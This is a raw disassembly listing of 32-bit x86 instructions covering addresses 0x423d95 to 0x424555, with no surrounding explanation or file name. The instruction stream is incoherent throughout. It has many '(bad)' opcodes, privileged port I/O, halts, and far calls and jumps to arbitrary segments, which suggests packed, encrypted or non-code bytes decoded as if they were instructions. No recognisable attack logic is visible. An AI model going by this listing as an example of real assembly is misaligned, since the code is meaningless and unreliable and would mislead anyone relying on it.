  423d95:	mov    edx,0xb174701f
  423d9a:	pop    esp
  423d9b:	nop
  423d9c:	push   ebp
  423d9d:	push   es
  423d9e:	in     eax,0x62
  423da0:	push   esp
  423da1:	mov    bl,0xdc
  423da3:	or     al,0x45
  423da5:	popw   ss
  423da7:	nop
  423da8:	xchg   esi,eax
  423da9:	test   al,0xa3
  423dab:	aaa    
  423dac:	mov    ecx,0xca100948
  423db1:	fbstp  TBYTE PTR [ecx+0x166ffdb8]
  423db7:	inc    ecx
  423db8:	lods   al,BYTE PTR ds:[esi]
  423db9:	pushf  
  423dba:	rcr    DWORD PTR [edx],0xa0
  423dbd:	aam    0x6
  423dbf:	fcomp  QWORD PTR [edi]
  423dc1:	scas   eax,DWORD PTR es:[edi]
  423dc2:	inc    ebx
  423dc3:	sti    
  423dc4:	das    
  423dc5:	hlt    
  423dc6:	dec    ebx
  423dc7:	fisubr DWORD PTR [ebx+0x0]
  423dca:	inc    eax
  423dcb:	mov    esi,0xa018cbd9
  423dd0:	sub    eax,DWORD PTR [ebx]
  423dd2:	les    ebp,FWORD PTR [edi-0x34]
  423dd5:	adc    eax,0x7dfbd912
  423dda:	(bad)  
  423ddb:	sub    edi,DWORD PTR [ebp+0x19b466b7]
  423de1:	push   ebp
  423de2:	arpl   WORD PTR [ebx],cx
  423de4:	pop    eax
  423de5:	dec    ebp
  423de6:	mov    cl,0x94
  423de8:	or     al,0x44
  423dea:	xor    al,0x79
  423dec:	leave  
  423ded:	popa   
  423dee:	mov    dl,0x8b
  423df0:	fstp   st(0)
  423df2:	jb     0x423df6
  423df4:	mov    esi,0x7899232a
  423df9:	mov    al,bh
  423dfb:	icebp  
  423dfc:	mov    ecx,0x4602e19f
  423e01:	out    0xd3,al
  423e03:	mov    edx,0xd9730b94
  423e08:	imul   ecx,DWORD PTR [ebx],0x45
  423e0b:	sahf   
  423e0c:	push   edx
  423e0d:	xor    DWORD PTR [edx+esi*8-0x705f8a9],esp
  423e14:	pop    edx
  423e15:	sub    edi,DWORD PTR [edx-0x4cd826f0]
  423e1b:	(bad)  
  423e1c:	mov    ecx,0xd06a532f
  423e21:	test   al,0x4d
  423e23:	add    BYTE PTR [ebx-0x56],0x7d
  423e27:	mov    WORD PTR [ecx+0x76],ds
  423e2a:	jnp    0x423e20
  423e2c:	mov    BYTE PTR [eax],dh
  423e2e:	xchg   edx,eax
  423e2f:	sbb    ecx,DWORD PTR [ecx]
  423e31:	add    DWORD PTR [esi+0x23],0x997ea277
  423e38:	mov    dh,0xe9
  423e3a:	sub    dh,BYTE PTR [ebx]
  423e3c:	mov    BYTE PTR [eax],dh
  423e3e:	leave  
  423e3f:	inc    edi
  423e40:	mov    esp,0x97ffe2a
  423e45:	data16 mov ds:0x9ba1112a,al
  423e4b:	inc    esp
  423e4c:	fdiv   DWORD PTR [esp+ecx*8+0x7e716223]
  423e53:	mov    bh,BYTE PTR [ebx-0x8f3bddc]
  423e59:	cdq    
  423e5a:	js     0x423e82
  423e5c:	fsubp  st(1),st
  423e5e:	or     al,0x9f
  423e60:	xchg   esi,eax
  423e61:	jb     0x423e12
  423e63:	mov    cl,0xc8
  423e65:	mov    ss,ebp
  423e67:	push   0x1417b5d0
  423e6c:	mov    ds,WORD PTR [edi+0x49de0907]
  423e72:	mov    esp,0x89cc0732
  423e77:	pop    es
  423e78:	popa   
  423e79:	cli    
  423e7a:	push   ss
  423e7b:	jg     0x423ee5
  423e7d:	fbld   TBYTE PTR [ebx-0x68]
  423e80:	jmp    edx
  423e82:	out    0xff,eax
	...
  423e90:	add    BYTE PTR [ecx],dh
  423e92:	retf   
  423e93:	xor    BYTE PTR [ebx-0x6],0x7b
  423e97:	icebp  
  423e98:	retf   
  423e99:	aam    0xe9
  423e9b:	imul   esp,ebp,0xfffffff3
  423e9e:	dec    esi
  423e9f:	out    0xb2,al
  423ea1:	jae    0x423e59
  423ea3:	add    DWORD PTR [eax],eax
  423ea5:	stos   DWORD PTR es:[edi],eax
  423ea6:	add    eax,DWORD PTR [eax]
  423ea8:	add    bl,dh
  423eaa:	add    al,0x80
  423eac:	add    ecx,ecx
  423eae:	sbb    esi,edx
  423eb0:	and    BYTE PTR [edi-0x63299634],cl
  423eb6:	mov    bl,0x7b
  423eb8:	rol    edi,cl
  423eba:	fisttp WORD PTR [ebx-0x41]
  423ebd:	rcr    ecx,1
  423ebf:	leave  
  423ec0:	and    BYTE PTR [ecx-0x28cf5df2],ah
  423ec6:	jbe    0x423eba
  423ec8:	popf   
  423ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423eca:	dec    esp
  423ecb:	aad    0x33
  423ecd:	add    edx,DWORD PTR [esi+0x200ab298]
  423ed3:	pop    ebp
  423ed4:	fistp  QWORD PTR [edx]
  423ed6:	neg    DWORD PTR [edx]
  423ed8:	pop    esp
  423ed9:	push   ds
  423eda:	ss es shr ecx,0xb4
  423edf:	xchg   ebp,eax
  423ee0:	pushf  
  423ee1:	in     eax,dx
  423ee2:	js     0x423f19
  423ee4:	jae    0x423f65
  423ee6:	bound  edx,QWORD PTR [ebx+0x3f]
  423ee9:	or     esi,edx
  423eeb:	jo     0x423ee7
  423eed:	ror    DWORD PTR [esi-0x4c],cl
  423ef0:	rcl    BYTE PTR [ebx+esi*1-0x7ddc8466],1
  423ef7:	mov    ds:0x48cbd257,al
  423efc:	repnz and BYTE PTR [edi],dh
  423eff:	stc    
  423f00:	jae    0x423ebf
  423f02:	outs   dx,BYTE PTR ds:[esi]
  423f03:	call   0xfd339283
  423f08:	imul   ecx,DWORD PTR [ecx],0xb2e7a662
  423f0e:	leave  
  423f0f:	pop    esi
  423f10:	xchg   DWORD PTR [ecx+ecx*2-0x7fed0afe],ebx
  423f17:	pop    es
  423f18:	in     al,0xaf
  423f1a:	or     eax,0x6344fde7
  423f1f:	xchg   BYTE PTR [ebx+0x57883de8],cl
  423f25:	gs ja  0x423f42
  423f28:	fucomi st,st(2)
  423f2a:	pop    ss
  423f2b:	ffreep st(5)
  423f2d:	lods   al,BYTE PTR ds:[esi]
  423f2e:	jo     0x423faa
  423f30:	repnz test al,0x83
  423f33:	inc    esp
  423f34:	sub    eax,DWORD PTR [ebx-0x3d5704a6]
  423f3a:	push   DWORD PTR [eax-0x7186c541]
  423f40:	(bad)  
  423f41:	ror    DWORD PTR [edx],cl
  423f43:	(bad)  
  423f44:	mov    ecx,0x8fb37a42
  423f49:	inc    ebp
  423f4a:	fdivr  st,st(5)
  423f4c:	cs aaa 
  423f4e:	pop    edi
  423f4f:	mov    cs,WORD PTR [eax]
  423f51:	sub    al,0x29
  423f53:	mov    dh,0xda
  423f55:	cmp    al,0x70
  423f57:	ins    BYTE PTR es:[edi],dx
  423f58:	push   ecx
  423f59:	cmp    eax,edx
  423f5b:	and    ecx,DWORD PTR [edx+ebx*2+0x77e65ffe]
  423f62:	sub    dl,BYTE PTR [ecx-0x72]
  423f65:	mov    ds,WORD PTR [edx+0x2db0999a]
  423f6b:	cwde   
  423f6c:	xchg   esi,eax
  423f6d:	loopne 0x423f2e
  423f6f:	nop
  423f70:	mov    al,0x85
  423f72:	xor    bh,BYTE PTR [eax+edx*4-0x729b5270]
  423f79:	(bad)  
  423f7a:	add    dh,BYTE PTR ds:0x898cb21a
  423f80:	add    al,0xd6
  423f82:	fwait
  423f83:	inc    esp
  423f84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f85:	out    dx,eax
  423f86:	jnp    0x423f4e
  423f88:	push   edi
  423f89:	pushf  
  423f8a:	rol    BYTE PTR [edi+0x6e],1
  423f8d:	jmp    0x423f6a
  423f8f:	in     al,0xad
  423f91:	dec    DWORD PTR [ecx-0x48169840]
  423f97:	fistp  QWORD PTR ds:0xe2cd100a
  423f9d:	int3   
  423f9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f9f:	aad    0xb8
  423fa1:	dec    esp
  423fa2:	dec    ecx
  423fa3:	(bad)  
  423fa4:	das    
  423fa5:	jno    0x423fea
  423fa7:	xchg   ebx,eax
  423fa8:	xor    al,0x94
  423faa:	sbb    eax,0x62c21aed
  423faf:	push   ebx
  423fb0:	xlat   BYTE PTR ds:[ebx]
  423fb1:	ins    BYTE PTR es:[edi],dx
  423fb2:	icebp  
  423fb3:	(bad)  
  423fb4:	mov    al,ds:0xd6518170
  423fb9:	enter  0xc4a3,0x99
  423fbd:	imul   ebx,esi,0x9cf7414d
  423fc3:	pop    edi
  423fc4:	clc    
  423fc5:	ins    DWORD PTR es:[edi],dx
  423fc6:	add    DWORD PTR [esi+esi*2-0x68971da5],edx
  423fcd:	xlat   BYTE PTR ds:[ebx]
  423fce:	jp     0x42404c
  423fd0:	out    0x75,al
  423fd2:	cmp    bh,BYTE PTR [eax-0x34776b6]
  423fd8:	xor    bl,BYTE PTR [ebx+0x6c]
  423fdb:	(bad)  
  423fdc:	dec    ecx
  423fdd:	loop   0x42400a
  423fdf:	and    esi,DWORD PTR [ebx-0x22]
  423fe2:	jno    0x423f77
  423fe4:	ror    esi,0x78
  423fe7:	es retf 
  423fe9:	xor    al,0xb5
  423feb:	sub    eax,0x35376a22
  423ff0:	lock arpl WORD PTR [esi],bx
  423ff3:	sub    al,0x4e
  423ff5:	mov    ecx,DWORD PTR [ecx+0x12]
  423ff8:	sti    
  423ff9:	cmp    BYTE PTR [ebp-0x2],ah
  423ffc:	in     al,dx
  423ffd:	dec    ecx
  423ffe:	mov    edi,0x8de52467
  424003:	inc    eax
  424004:	xchg   ebx,eax
  424005:	sbb    bh,BYTE PTR [eax+0x39]
  424008:	jl     0x423fb3
  42400a:	jmp    0x1065fae9
  42400f:	ds pop esp
  424011:	inc    eax
  424012:	stc    
  424013:	inc    edi
  424014:	out    dx,al
  424015:	call   0x51bd:0xd6c6ae65
  42401c:	mov    dl,0x8a
  42401e:	call   0xcb513895
  424023:	(bad)  
  424024:	inc    DWORD PTR ds:0x26a9d891
  42402a:	jns    0x424022
  42402c:	inc    eax
  42402d:	inc    ebp
  42402e:	xchg   esi,eax
  42402f:	cwde   
  424030:	xchg   esp,eax
  424031:	fwait
  424032:	and    eax,0x51c12628
  424037:	jb     0x423fee
  424039:	xchg   ecx,eax
  42403a:	sub    edi,0xe
  42403d:	fisttp DWORD PTR [esi+esi*1+0x3852a6ca]
  424044:	shr    DWORD PTR [edx],cl
  424046:	jnp    0x424083
  424048:	add    dl,al
  42404a:	arpl   WORD PTR [esi-0x6d],cx
  42404d:	xchg   esi,eax
  42404e:	mov    ah,0x88
  424050:	push   ebx
  424051:	lds    esi,FWORD PTR [edx]
  424053:	inc    esi
  424054:	call   0x1250:0x901e75e9
  42405b:	xchg   esp,eax
  42405c:	mov    ch,0x4f
  42405e:	enter  0xbbef,0x43
  424062:	pop    edi
  424063:	fnstsw WORD PTR [ebx]
  424065:	ja     0x424036
  424067:	pop    es
  424068:	hlt    
  424069:	fmul   QWORD PTR [esi]
  42406b:	sub    DWORD PTR [esi+0x40],0xbcf54d3a
  424072:	jp     0x424019
  424074:	call   DWORD PTR [eax+0x4e3d4e86]
  42407a:	in     al,dx
  42407b:	mov    dl,0x96
  42407d:	mov    BYTE PTR [ebp-0x13],dl
  424080:	aad    0xc0
  424082:	mov    edi,0x95199290
  424087:	repnz fwait
  424089:	mov    dh,0x7f
  42408b:	loope  0x4240e9
  42408d:	(bad)  
  42408e:	in     al,0xd0
  424090:	fidivr DWORD PTR [ebx]
  424092:	inc    edi
  424093:	lods   eax,DWORD PTR ds:[esi]
  424094:	sbb    BYTE PTR [ebx-0x27],bh
  424097:	nop
  424098:	pop    ebp
  424099:	je     0x4240b8
  42409b:	pop    esi
  42409c:	loopne 0x42403e
  42409e:	ja     0x42402f
  4240a0:	adc    eax,0xf089068e
  4240a5:	int3   
  4240a6:	add    al,0xbc
  4240a8:	int    0x7c
  4240aa:	mov    ebp,0xce976957
  4240af:	stos   BYTE PTR es:[edi],al
  4240b0:	scas   al,BYTE PTR es:[edi]
  4240b1:	lods   al,BYTE PTR ds:[esi]
  4240b2:	jle    0x424034
  4240b4:	add    cl,BYTE PTR [ecx]
  4240b6:	cmp    ch,BYTE PTR [ebx+ebx*1+0x9d09954]
  4240bd:	mov    ch,0x23
  4240bf:	pop    es
  4240c0:	(bad)  
  4240c1:	sti    
  4240c2:	ja     0x42409e
  4240c4:	xchg   edi,eax
  4240c5:	fdivr  DWORD PTR [edi-0xf]
  4240c8:	xchg   ebx,eax
  4240c9:	jg     0x4240c3
  4240cb:	scas   eax,DWORD PTR es:[edi]
  4240cc:	sub    BYTE PTR [ebp+0x75],ch
  4240cf:	jp     0x42414d
  4240d1:	jae    0x424100
  4240d3:	ds dec esi
  4240d5:	xor    eax,0x8e606626
  4240da:	push   ss
  4240db:	popf   
  4240dc:	fwait
  4240dd:	lds    eax,FWORD PTR [ebp+esi*4+0x0]
  4240e1:	ds mov bl,0xfe
  4240e4:	add    edx,edx
  4240e6:	fcomp  DWORD PTR [edx+0x6516d895]
  4240ec:	sbb    al,BYTE PTR [ebp+0x2a]
  4240ef:	or     al,0xeb
  4240f1:	inc    ecx
  4240f2:	and    DWORD PTR [ecx+0x14fd022e],edx
  4240f8:	mov    ds:0x4aed2423,eax
  4240fd:	jle    0x424105
  4240ff:	mov    edi,0x2f5f964a
  424104:	dec    esi
  424105:	sbb    al,0x4c
  424107:	xchg   ebx,eax
  424108:	sbb    BYTE PTR [edi+eax*8+0x6e],ch
  42410c:	hlt    
  42410d:	ja     0x42409d
  42410f:	jae    0x4240a9
  424111:	xchg   ebp,eax
  424112:	shl    DWORD PTR [esi+ecx*2-0x24595f6a],cl
  424119:	out    0xe2,al
  42411b:	mov    ss,WORD PTR [esi+ecx*2-0x6a]
  42411f:	imul   esp,DWORD PTR [edx+ebx*1+0x36de6482],0x58
  424127:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424128:	pushf  
  424129:	sub    al,0x5
  42412b:	imul   edi,DWORD PTR [esi+0x45],0xd826cf1c
  424132:	in     al,0x7c
  424134:	clc    
  424135:	lahf   
  424136:	push   edx
  424137:	dec    esp
  424138:	js     0x424195
  42413a:	lods   eax,DWORD PTR ds:[esi]
  42413b:	scas   eax,DWORD PTR es:[edi]
  42413c:	pop    esi
  42413d:	xchg   DWORD PTR [edx-0x6],eax
  424140:	sbb    edi,esi
  424142:	xchg   ebp,eax
  424143:	sbb    bh,BYTE PTR [eax+0x5c66b609]
  424149:	mov    ebx,0xa6625117
  42414e:	xor    edx,DWORD PTR [ecx-0x71]
  424151:	pusha  
  424152:	push   eax
  424153:	leave  
  424154:	outs   dx,BYTE PTR ds:[esi]
  424155:	ss gs sbb eax,0x2cd933cf
  42415c:	shl    ebx,0xe5
  42415f:	dec    esp
  424160:	sub    DWORD PTR ss:[edx-0x4d],eax
  424164:	pushf  
  424165:	jmp    0xf92a:0x52407ad2
  42416c:	test   eax,0x1028db1f
  424171:	loope  0x4241e4
  424173:	xchg   esi,eax
  424174:	cli    
  424175:	pop    eax
  424176:	and    eax,0xea663317
  42417b:	xchg   edi,eax
  42417c:	sub    BYTE PTR [eax+ebp*4-0x7],0xbd
  424181:	adc    eax,DWORD PTR [ebp-0x798a3175]
  424187:	cli    
  424188:	(bad)  
  424189:	adc    eax,DWORD PTR [edi]
  42418b:	repnz xor eax,0x5a082458
  424191:	jge    0x424212
  424193:	(bad)  
  424194:	bound  esp,QWORD PTR [edi+0x4728418]
  42419a:	pop    ecx
  42419b:	add    al,0x66
  42419d:	mov    al,0xea
  42419f:	inc    esi
  4241a0:	jl     0x42421b
  4241a2:	and    edx,DWORD PTR [edi]
  4241a4:	mov    ch,0xfa
  4241a6:	and    bh,ah
  4241a8:	(bad)  
  4241a9:	fidiv  DWORD PTR [edi-0x79]
  4241ac:	lods   eax,DWORD PTR ds:[esi]
  4241ad:	(bad)  
  4241ae:	jmp    0x4241f7
  4241b0:	fld    QWORD PTR [ecx-0x3a]
  4241b3:	ror    DWORD PTR [edx+0x2d7ad77e],cl
  4241b9:	mov    eax,0xa1b3db73
  4241be:	in     al,0x1a
  4241c0:	xor    al,0x1c
  4241c2:	retf   
  4241c3:	adc    ecx,edx
  4241c5:	pusha  
  4241c6:	xor    eax,0xbe542f09
  4241cb:	mov    esi,0xdae51833
  4241d0:	and    eax,DWORD PTR [eax]
  4241d2:	add    bl,BYTE PTR [esp+esi*1-0x19e24235]
  4241d9:	xchg   edi,eax
  4241da:	mov    ecx,0x3614ddb0
  4241df:	jmp    0x424229
  4241e1:	dec    ecx
  4241e2:	xlat   BYTE PTR ds:[ebx]
  4241e3:	clc    
  4241e4:	pushf  
  4241e5:	jp     0x4241bc
  4241e7:	dec    ecx
  4241e8:	dec    edi
  4241e9:	ins    DWORD PTR es:[edi],dx
  4241ea:	mov    bl,0xa
  4241ec:	loop   0x42417f
  4241ee:	(bad)  
  4241ef:	add    DWORD PTR [esi-0x19],esi
  4241f2:	jp     0x42422f
  4241f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241f6:	jmp    0x4241ac
  4241f8:	aas    
  4241f9:	xchg   ebp,eax
  4241fa:	ins    BYTE PTR es:[edi],dx
  4241fb:	jmp    0x1e6476d5
  424200:	sub    BYTE PTR [edi],ah
  424202:	adc    DWORD PTR [edx-0x72],0xffffffb7
  424206:	int3   
  424207:	daa    
  424208:	les    esp,FWORD PTR [edi+0x42c12555]
  42420e:	push   es
  42420f:	mov    bh,al
  424211:	mov    al,0x48
  424213:	cmp    esp,esi
  424215:	xor    al,0xb6
  424217:	cmp    ebx,ebp
  424219:	mov    bh,0x79
  42421b:	call   0xbb2e:0x646364a6
  424222:	ret    0x1b3e
  424225:	pop    ds
  424226:	mov    al,ds:0xc6c92562
  42422b:	and    eax,0x7225ca3a
  424230:	rcr    BYTE PTR [ebp+0x16],cl
  424233:	inc    ecx
  424234:	push   ds
  424235:	add    bh,BYTE PTR [edx+0x58]
  424238:	add    DWORD PTR [ecx-0x3e],eax
  42423b:	rcl    BYTE PTR [ebx+0x65],0xd7
  42423f:	mov    ds:0x3fbc9383,eax
  424244:	gs dec ecx
  424246:	and    al,0xca
  424248:	jmp    0x424292
  42424a:	cmp    al,0xe5
  42424c:	lds    ecx,FWORD PTR fs:[ebp+0x16]
  424250:	jle    0x4241d4
  424252:	repnz adc eax,DWORD PTR [eax]
	...
  424261:	mul    ebp
  424263:	lahf   
  424264:	jp     0x424205
  424266:	jp     0x42425f
  424268:	in     eax,dx
  424269:	sar    DWORD PTR [edi-0x564ded4],1
  42426f:	test   BYTE PTR [edx+0x1ba1e],bl
  424275:	stos   DWORD PTR es:[edi],eax
  424276:	add    eax,DWORD PTR [eax]
  424278:	add    BYTE PTR ds:0xc0aaacdc,bl
  42427e:	sti    
  42427f:	jp     0x42424b
  424281:	inc    edi
  424282:	push   es
  424283:	jb     0x4242a3
  424285:	xlat   BYTE PTR ds:[ebx]
  424286:	pop    es
  424287:	cmp    ebp,DWORD PTR [edx+0x6b]
  42428a:	xor    eax,0x56fbfe8f
  42428f:	jg     0x4242ab
  424291:	jecxz  0x424240
  424293:	jp     0x4242ae
  424295:	or     ebx,0xffffffc5
  424298:	out    dx,eax
  424299:	dec    esi
  42429a:	arpl   WORD PTR [ebx+0x75f99d5d],bx
  4242a0:	cwde   
  4242a1:	mov    eax,ds:0x6d317b58
  4242a6:	mov    bh,0x19
  4242a8:	sub    edi,DWORD PTR [edi-0x1aa37ac3]
  4242ae:	(bad)  
  4242af:	cmp    DWORD PTR [edx-0x1e792433],ebp
  4242b5:	sbb    BYTE PTR [esi+0x2898a109],0x20
  4242bc:	test   DWORD PTR [esi],ebx
  4242be:	adc    BYTE PTR [ecx-0x1],al
  4242c1:	mov    ch,0xd2
  4242c3:	ret    0xea14
  4242c6:	mov    ds:0xdc0d516f,eax
  4242cb:	adc    eax,0x5e93082b
  4242d0:	mov    bl,0x99
  4242d2:	push   ecx
  4242d3:	add    bh,BYTE PTR [ecx]
  4242d5:	mov    fs,WORD PTR [edi+0x57]
  4242d8:	into   
  4242d9:	(bad)  
  4242da:	stc    
  4242db:	fwait
  4242dc:	inc    ecx
  4242dd:	call   0x83e4b21f
  4242e2:	cs in  al,0x3d
  4242e5:	lods   eax,DWORD PTR ds:[esi]
  4242e6:	das    
  4242e7:	(bad)  
  4242e8:	jle    0x424293
  4242ea:	push   ecx
  4242eb:	mov    ebp,0x72412804
  4242f0:	jne    0x4242c6
  4242f2:	sbb    BYTE PTR [ecx+esi*4-0xe],bh
  4242f6:	sub    eax,0x8e309104
  4242fb:	dec    ebp
  4242fc:	sub    DWORD PTR [esi+0x66],eax
  4242ff:	sub    DWORD PTR [edi-0x671603a],esi
  424305:	dec    ecx
  424306:	in     eax,0xec
  424308:	push   edx
  424309:	push   ecx
  42430a:	adc    DWORD PTR [eax+0x5f],eax
  42430d:	add    ecx,ecx
  42430f:	xlat   BYTE PTR ds:[ebx]
  424310:	jnp    0x424308
  424312:	(bad)  
  424313:	jmp    0x6b66d14b
  424318:	push   0x21d967c1
  42431d:	ja     0x4242f3
  42431f:	jp     0x4242f9
  424321:	retf   0xeea8
  424324:	mov    esi,0xea879206
  424329:	jae    0x4242b5
  42432b:	xlat   BYTE PTR ds:[ebx]
  42432c:	add    al,BYTE PTR [edx-0x25]
  42432f:	fld    QWORD PTR [esi+0x38]
  424332:	ret    
  424333:	repz adc DWORD PTR [edi+0x76f8c707],ebp
  42433a:	jge    0x424381
  42433c:	shr    cl,0x72
  42433f:	adc    cl,BYTE PTR [edi-0x7a]
  424342:	cmp    al,BYTE PTR [edx+eiz*1+0x25]
  424346:	je     0x4243bb
  424348:	mov    eax,ds:0xa9a28fd
  42434d:	dec    edi
  42434e:	iret   
  42434f:	push   ss
  424350:	(bad)  
  424351:	mov    ds:0x24b84c13,al
  424356:	or     ax,WORD PTR [ebx+0x29]
  42435a:	js     0x42434f
  42435c:	add    cl,BYTE PTR [edx+0x1004e6e9]
  424362:	dec    ebp
  424363:	fmul   DWORD PTR [ebp-0x11]
  424366:	pop    ebx
  424367:	lds    edx,FWORD PTR [esi-0x33]
  42436a:	and    cl,BYTE PTR [ecx]
  42436c:	inc    eax
  42436d:	bound  ecx,QWORD PTR ds:0x7c50ed91
  424373:	data16 (bad) 
  424377:	aam    0xdf
  424379:	or     DWORD PTR [esi],ebx
  42437b:	call   0xaf6abea5
  424380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424381:	dec    eax
  424382:	popf   
  424383:	icebp  
  424384:	add    esp,DWORD PTR [esi+0x32f24b72]
  42438a:	pop    esi
  42438b:	loop   0x4243c0
  42438d:	add    al,ah
  42438f:	aam    0x8b
  424391:	cmp    DWORD PTR [ecx],ebp
  424393:	sbb    BYTE PTR [esi],dh
  424395:	gs std 
  424397:	and    edi,DWORD PTR [ecx+0xe]
  42439a:	retf   
  42439b:	int    0xc3
  42439d:	in     eax,0x96
  42439f:	xchg   edx,eax
  4243a0:	jmp    0xb7349c94
  4243a5:	pop    esp
  4243a6:	das    
  4243a7:	call   0xe237:0x20db8c45
  4243ae:	out    dx,al
  4243af:	cld    
  4243b0:	bound  ebx,QWORD PTR [ebp-0x6c]
  4243b3:	xchg   ebx,eax
  4243b4:	xchg   DWORD PTR [esi-0x69],esi
  4243b7:	hlt    
  4243b8:	push   0xba679f83
  4243bd:	push   esp
  4243be:	mov    DWORD PTR [eax-0x62],ebx
  4243c1:	cld    
  4243c2:	pop    esi
  4243c3:	jns    0x4243a6
  4243c5:	sbb    ah,BYTE PTR [esi-0xf]
  4243c8:	fsub   QWORD PTR [esi-0x3e]
  4243cb:	hlt    
  4243cc:	lea    ecx,[edi+0x504c593]
  4243d2:	arpl   sp,bp
  4243d4:	enter  0x48d4,0x74
  4243d8:	xlat   BYTE PTR ds:[ebx]
  4243d9:	and    DWORD PTR [ecx-0x5b],eax
  4243dc:	dec    edx
  4243dd:	xor    al,0x26
  4243df:	ret    
  4243e0:	and    cl,ah
  4243e2:	loope  0x4243dc
  4243e4:	leave  
  4243e5:	cmc    
  4243e6:	inc    edx
  4243e7:	sbb    ebx,DWORD PTR [eax-0x470d27b5]
  4243ed:	lahf   
  4243ee:	(bad)  
  4243ef:	and    bl,BYTE PTR [ecx-0x7445fe26]
  4243f5:	stos   BYTE PTR es:[edi],al
  4243f6:	outs   dx,DWORD PTR ds:[esi]
  4243f7:	sbb    edx,ebx
  4243f9:	cmp    al,0x8
  4243fb:	jecxz  0x42442e
  4243fd:	pop    ebp
  4243fe:	sbb    edx,DWORD PTR [edx]
  424400:	mov    ecx,0x564bc597
  424405:	std    
  424406:	(bad)  
  424407:	fidivr WORD PTR [edi]
  424409:	sbb    DWORD PTR [ebx],esp
  42440b:	or     eax,0xdb055bb2
  424410:	mov    esi,0xf2757d8d
  424415:	mov    dh,0x9c
  424417:	push   edx
  424418:	out    dx,eax
  424419:	cmp    eax,0xe30ed2e7
  42441e:	sub    eax,0x57396b2b
  424423:	mov    edx,0x21f9dfbe
  424428:	rol    BYTE PTR [edi-0x5ffaa46e],0xcc
  42442f:	dec    edi
  424430:	sbb    eax,0x3a9c2bec
  424435:	lods   eax,DWORD PTR ds:[esi]
  424436:	add    BYTE PTR [edx],dl
  424438:	test   eax,0xeaa8a345
  42443d:	sub    edi,ebx
  42443f:	cmp    DWORD PTR [eax],ecx
  424441:	in     eax,0x62
  424443:	jmp    0xeac:0xbe53b88d
  42444a:	ds add esp,edx
  42444d:	jbe    0x424408
  42444f:	jge    0x4244a9
  424451:	ds jbe 0x424483
  424454:	test   DWORD PTR [ecx+0x3b],0xe85b1a47
  42445b:	xchg   edx,eax
  42445c:	les    edi,FWORD PTR [esi+0x2b]
  42445f:	sbb    al,BYTE PTR [edx-0x36437c7d]
  424465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424466:	sbb    ch,BYTE PTR [ebp+0x61]
  424469:	popf   
  42446a:	inc    edx
  42446b:	bound  ecx,QWORD PTR [eax]
  42446d:	add    edx,0xffffffe7
  424470:	dec    edi
  424471:	imul   eax,ebx,0xffffff91
  424474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424475:	fisttp WORD PTR [esi]
  424477:	(bad)  
  424478:	inc    DWORD PTR [edi-0x5c]
  42447b:	xchg   edx,eax
  42447c:	add    eax,0xb7658a12
  424481:	push   0x27
  424483:	lds    esi,FWORD PTR [ecx-0x68652851]
  424489:	xchg   BYTE PTR [edx+ebx*8-0x3c83c3e5],ah
  424490:	sbb    BYTE PTR [esi+0x7d],ch
  424493:	mov    dh,0x69
  424495:	ins    DWORD PTR es:[edi],dx
  424496:	inc    ebx
  424497:	mov    esp,0xc2887a95
  42449c:	ins    DWORD PTR es:[edi],dx
  42449d:	mov    ah,0xa1
  42449f:	pop    edx
  4244a0:	xor    ebx,DWORD PTR [ecx]
  4244a2:	loopne 0x4244a9
  4244a4:	sub    cl,BYTE PTR [edx+0x5f474d3f]
  4244aa:	in     eax,dx
  4244ab:	(bad)  
  4244ac:	jo     0x4244da
  4244ae:	in     al,dx
  4244af:	sbb    al,BYTE PTR [ecx-0xb59b633]
  4244b5:	hlt    
  4244b6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244b8:	(bad)  
  4244b9:	scas   al,BYTE PTR es:[edi]
  4244ba:	push   0x65
  4244bc:	xchg   BYTE PTR [eax+0x3c7613e7],ah
  4244c2:	mov    ch,BYTE PTR [ebp+0x3206185a]
  4244c8:	mov    ah,0x8b
  4244ca:	outs   dx,DWORD PTR ds:[esi]
  4244cb:	pop    esi
  4244cc:	popa   
  4244cd:	dec    ebp
  4244ce:	or     al,0x5e
  4244d0:	call   0xeb5bb45f
  4244d5:	xor    esi,DWORD PTR [esi-0x13e1d13b]
  4244db:	sahf   
  4244dc:	add    DWORD PTR cs:[edi],edi
  4244df:	fisttp WORD PTR [ebp-0x25]
  4244e2:	mov    dh,0xb1
  4244e4:	pop    es
  4244e5:	jns    0x42449f
  4244e7:	inc    ebx
  4244e8:	jbe    0x42451a
  4244ea:	icebp  
  4244eb:	mov    DWORD PTR [ebx-0x10c2fc31],ebp
  4244f1:	adc    bl,ch
  4244f3:	mov    al,ds:0xa4131578
  4244f8:	adc    eax,0x914d6aa1
  4244fd:	mov    edi,0x66e42fcc
  424502:	mov    al,0x2d
  424504:	xchg   edi,eax
  424505:	mov    dh,dl
  424507:	into   
  424508:	jecxz  0x424570
  42450a:	scas   al,BYTE PTR es:[edi]
  42450b:	je     0x42454e
  42450d:	bnd je 0x42454d
  424510:	call   0x4a7416a4
  424515:	stc    
  424516:	icebp  
  424517:	sbb    BYTE PTR [eax-0x2fa562aa],bh
  42451d:	imul   ebx,esi,0xb765a59b
  424523:	lock mov WORD PTR [ebx],es
  424526:	ss call 0xe79a:0x1ea810bf
  42452e:	pop    es
  42452f:	mov    dh,0x1c
  424532:	ds int 0xb7
  424535:	mov    cs,WORD PTR [esi+0x3]
  424538:	stos   BYTE PTR es:[edi],al
  424539:	inc    esp
  42453a:	out    dx,al
  42453b:	loope  0x42451b
  42453d:	dec    edx
  42453e:	popf   
  42453f:	in     al,0xb8
  424541:	clc    
  424542:	pop    esi
  424543:	ffreep st(6)
  424545:	ins    BYTE PTR es:[edi],dx
  424546:	out    dx,al
  424547:	cmp    al,0x31
  424549:	(bad)  
  42454a:	out    dx,al
  42454b:	lock inc eax
  42454d:	mov    esi,ecx
  42454f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424550:	xchg   esp,eax
  424551:	shl    cl,cl
  424553:	push   edx
  424554:	cli    
  424555:	stos   DWORD PTR es:[edi],eax
